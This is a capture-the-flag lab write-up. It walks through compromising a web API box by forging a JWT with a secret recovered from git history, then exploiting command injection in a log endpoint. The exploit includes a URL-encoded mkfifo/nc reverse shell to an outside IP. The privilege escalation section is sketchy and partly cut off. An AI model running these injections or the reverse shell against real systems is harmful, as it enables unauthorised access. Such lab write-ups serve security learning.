# User

## Web Enumeration

Nmap
```shell
# Nmap 7.92 scan initiated Fri Mar 25 13:06:23 2022 as: nmap -sV -sC -oA nmap-results 10.10.11.120
Nmap scan report for 10.10.11.120 (10.10.11.120)
Host is up (0.073s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open     http    Node.js (Express middleware)
|_http-title: DUMB Docs
4129/tcp filtered nuauth
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 25 13:06:42 2022 -- 1 IP address (1 host up) scanned in 18.78 seconds
```

Gobuster results with medium wordlist
```shell
/api                  (Status: 200) [Size: 93]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/docs                 (Status: 200) [Size: 20720]
/download             (Status: 301) [Size: 183] [--> /download/]
```

## Website Enumeration

This is a website of some kind of an open-source API with a live demo mode, which heads to `api/priv`. There is a documentation page, that has a lot of information about how the API works.

First, in the Log In section, there is an example of a log in request with an email and a password and I try to see, if this happens to be a valid admin account.
```
curl -X POST -H 'Content-Type: application/json' -i 'http://10.10.11.120/api/user/login' --data '{
"email": "root@dasith.works",
"password": "Kekc8swFgD6zU"
}'
```
No luck here unfortunately. 
So I proceed to register a new user, using the information given.
```
curl -X POST -H 'Content-Type: application/json' -i 'http://10.10.11.120/api/user/register' --data '{
"name": "testuser",
"email": "testuser@dasith.works",
"password": "testuser"
}'
```
with a succesfull response `{"user":"testuser"}`. I try to log in with these credentials to see that it really works.
```
curl -X POST -H 'Content-Type: application/json' -i 'http://10.10.11.120/api/user/login' --data '{
"email": "testuser@dasith.works",
"password": "testuser"
}'
```
with succes and response is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGVzdHVzZXIiLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.WdLNQs7gWNqS1-zDfhXstyqoqm7Y2UUXK8E0tkIFkxw`. This is the JWT token that authenticates user *"testuser"*.

Now I try to access `api/priv`
```
curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGVzdHVzZXIiLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.WdLNQs7gWNqS1-zDfhXstyqoqm7Y2UUXK8E0tkIFkxw' -i 'http://10.10.11.120/api/priv
```
and response is `{"role":{"role":"you are normal user","desc":"testuser"}}`. So I logged in as a user, but I need to find an other way to gain access as admin. I'm going to keep looking on the website for any other information, that could be helpful.

I find out that, I can download the source code, which can be really useful.

## Source Code Examination

Create JWT in log in
`routes/auth.js`
```js
    // create jwt 
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);
```

`/priv`
`rotes/private.js`
```js
router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)

    const userinfo = { name: req.user }

    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

```js
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})

router.use(function (req, res, next) {
    res.json({
        message: {

            message: "404 page not found",
            desc: "page you are looking for is not found. "
        }
    })
});
```

## JWT Forging

Using jwt.io and the JWT token I got with "testuser", I will try to forge a new one with `name="theadmin"` and the `TOKEN_SECRET=secret`(email doesn't really matter, since it checks only if `name="theadmin"`).
![jwtsecret](img/jwtfake.png)
Then I try to login with forged JWT token with `TOKEN_SECRET=secret`
```
curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.DTKfqkj0GUAI46OLUGTwoOnBEgbQ0PkWk9pVMUz95g4' -i 'http://10.10.11.120/api/priv'
```
But it's rejected. This means, that the token secret has been changed, before the source code was uploaded.

Look in `.git` and find file `logs/HEAD` with commit history and a commit with description `commit: removed .env for security reasons`
Go back to that commit with:
![gitdiff](img/gitdiff.png)


Now I can forge the JWT token, this time with the real `TOKEN_SECRET`.
![jwtlegit](img/jwtlegit.png)

and login with it
```
curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/priv'
```

I am now authenticated as the admin! 
 `{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}`

I have to find a way to make use of this, in order to get a reverse shell.

```
curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/logs?file=;whoami'
```

and response `"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\ndasith\n"`

```
curl -X GET -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/logs?file=;rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.74%204242%20%3E%2Ftmp%2Ff'
```

I got the reverse shell and **User Flag** ✔️!!

# Privillege Escalation

`find / -type f -perm -u=s 2>/dev/null`


Find `/opt/count` and visiting `/opt` there is a .c file also.
![code](img/code.png)

This program, reads a path from user input, loads it in it's memory and counts how many rows it has if it's a file or how many

Now I search the flag in the `strings CoreDump`.

![shell1](img/shell1.png)

![shell2](img/shell2.png)

![unpack](img/unpack.png)

![coredump](img/coredump.png)


**Root Flag** ✔️!!!





